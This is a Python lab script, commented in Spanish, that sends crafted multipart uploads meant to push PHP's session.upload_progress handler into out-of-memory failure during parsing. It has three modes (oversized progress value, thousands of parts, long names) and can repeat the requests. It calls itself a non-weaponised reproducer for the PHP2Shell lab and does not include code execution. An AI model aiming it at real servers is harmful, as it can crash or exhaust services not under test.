#!/usr/bin/env python3
"""
Reproductor mínimo y NO armado para el laboratorio PHP2Shell.

Objetivo: llevar al handler de session.upload_progress a un fallo de
asignación (memory_limit) DURANTE el parseo multipart, antes de que el
script de la aplicación se ejecute.

No contiene heap grooming, estructuras falsas, direcciones de memoria ni
llamadas a system(): no es un exploit de RCE, solo un comprobador del
mecanismo de fallo.

Uso:
    python3 trigger.py --url http://127.0.0.1:8080/ --mode progress
    python3 trigger.py --url ... --mode parts  --parts 4000
    python3 trigger.py --url ... --mode names  --parts 1000 --name-len 1024

Basado en la forma de los casos de tests/basic/oom_rfc1867_upload_progress.phpt
del propio php-src.
"""
from __future__ import annotations

import argparse
import http.client
import os
import sys
import time
import urllib.parse

BOUNDARY = "----php2shellLabBoundary"


def part(headers: str, body: bytes) -> bytes:
    return b"--" + BOUNDARY.encode() + b"\r\n" + headers.encode() + b"\r\n\r\n" + body + b"\r\n"


def text_part(name: str, value: bytes) -> bytes:
    return part(f'Content-Disposition: form-data; name="{name}"', value)


def file_part(name: str, filename: str, data: bytes) -> bytes:
    return part(
        f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
        f"Content-Type: text/plain",
        data,
    )


def build_body(args: argparse.Namespace, sid: str) -> bytes:
    chunks: list[bytes] = []
    # El handler solo se activa cuando ya vio el id de sesión y la clave de
    # progreso, por eso estos dos campos van primero.
    chunks.append(text_part("PHPSESSID", sid.encode()))
    chunks.append(text_part("PHP_SESSION_UPLOAD_PROGRESS", b"k"))

    if args.mode == "progress":
        # Un valor enorme de PHP_SESSION_UPLOAD_PROGRESS: el handler lo copia
        # en la clave de progreso y la asignación falla dentro del handler.
        chunks.append(text_part("PHP_SESSION_UPLOAD_PROGRESS", b"A" * args.size))
        chunks.append(file_part("u0", "f0.txt", b"xxxxxxxx"))

    elif args.mode == "parts":
        # Muchas partes pequeñas: $_SESSION[...]['files'] crece por parte y
        # la sesión completa se re-codifica en cada tick (coste O(n^2)).
        for i in range(args.parts):
            chunks.append(file_part(f"u{i}", f"f{i}.txt", b"xxxxxxxx"))

    elif args.mode == "names":
        # Menos partes pero con nombres de campo/archivo muy largos: el
        # handler copia ambos en el array de progreso.
        for i in range(args.parts):
            name = (f"u{i}").ljust(args.name_len, "B")
            chunks.append(file_part(name, name + ".txt", b"xxxxxxxx"))

    else:  # pragma: no cover
        raise ValueError(args.mode)

    chunks.append(b"--" + BOUNDARY.encode() + b"--\r\n")
    return b"".join(chunks)


def main() -> int:
    p = argparse.ArgumentParser(description="Trigger controlado de OOM en session.upload_progress")
    p.add_argument("--url", default="http://127.0.0.1:8080/")
    p.add_argument("--mode", choices=["progress", "parts", "names"], default="progress")
    p.add_argument("--size", type=int, default=1024 * 1024,
                   help="bytes del valor de progreso (mode=progress)")
    p.add_argument("--parts", type=int, default=4000, help="nº de partes (parts/names)")
    p.add_argument("--name-len", type=int, default=1024, help="longitud de nombres (names)")
    p.add_argument("--repeat", type=int, default=1)
    p.add_argument("--delay", type=float, default=0.5)
    p.add_argument("--timeout", type=float, default=60.0)
    args = p.parse_args()

    u = urllib.parse.urlsplit(args.url)
    if u.scheme not in ("http", "https"):
        print("URL no válida", file=sys.stderr)
        return 2
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    sid = os.urandom(16).hex()
    body = build_body(args, sid)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "Content-Length": str(len(body)),
        "Cookie": f"PHPSESSID={sid}",
        "Connection": "close",
        "User-Agent": "php2shell-lab-check/1.0",
    }

    print(f"[i] destino={args.url} modo={args.mode} body={len(body)} bytes sid={sid}")

    for n in range(1, args.repeat + 1):
        t0 = time.time()
        conn = (http.client.HTTPSConnection if u.scheme == "https" else http.client.HTTPConnection)(
            host, port, timeout=args.timeout
        )
        try:
            conn.request("POST", path, body=body, headers=headers)
            resp = conn.getresponse()
            data = resp.read(512)
            elapsed = time.time() - t0
            print(f"[{n}/{args.repeat}] HTTP {resp.status} {resp.reason} "
                  f"({elapsed:.2f}s) body[:120]={data[:120]!r}")
        except Exception as exc:  # conexión cortada = señal interesante
            elapsed = time.time() - t0
            print(f"[{n}/{args.repeat}] error de transporte tras {elapsed:.2f}s: {exc!r}")
        finally:
            conn.close()
        if n < args.repeat:
            time.sleep(args.delay)

    print("\n[i] Revisa ahora:")
    print("    docker compose logs --since=2m php")
    print("    docker compose logs --since=2m nginx")
    print("    docker compose exec php sh -c 'ls -l /tmp/sess_* 2>/dev/null; "
          "head -c 300 /tmp/sess_* 2>/dev/null'")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
